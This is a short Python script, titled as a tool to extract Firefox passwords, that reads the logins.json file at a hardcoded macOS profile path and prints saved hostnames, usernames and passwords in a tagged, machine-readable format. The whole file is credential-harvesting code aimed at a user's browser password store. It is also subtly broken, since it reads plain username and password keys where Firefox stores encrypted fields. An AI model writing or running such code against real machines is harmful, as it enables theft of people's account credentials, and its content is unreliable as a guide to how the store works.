#!/usr/bin/env python3
"""Extract Firefox passwords - lightweight script"""
import json
import sys
import os

logins_file = os.path.expanduser("~/Library/Application Support/Firefox/Profiles/yxo4pq2t.default-release/logins.json")

if not os.path.exists(logins_file):
    print("FILE_NOT_FOUND", file=sys.stderr)
    sys.exit(1)

try:
    with open(logins_file, 'r') as f:
        data = json.load(f)
    
    if isinstance(data, dict) and 'logins' in data:
        logins = data['logins']
        print(f"FIREFOX_COUNT|{len(logins)}", file=sys.stderr)
        
        for i, login in enumerate(logins[:10]):
            hostname = login.get('hostname', 'Unknown')
            username = login.get('username', '')
            password = login.get('password', '')
            
            print(f"FIREFOX_LOGIN|{hostname}|{username}|{password[:50]}")
        
        if len(logins) > 10:
            print(f"FIREFOX_REMAINING|{len(logins) - 10}", file=sys.stderr)
    else:
        print("NO_LOGINS_KEY", file=sys.stderr)
except Exception as e:
    print(f"ERROR|{e}", file=sys.stderr)
    sys.exit(1)

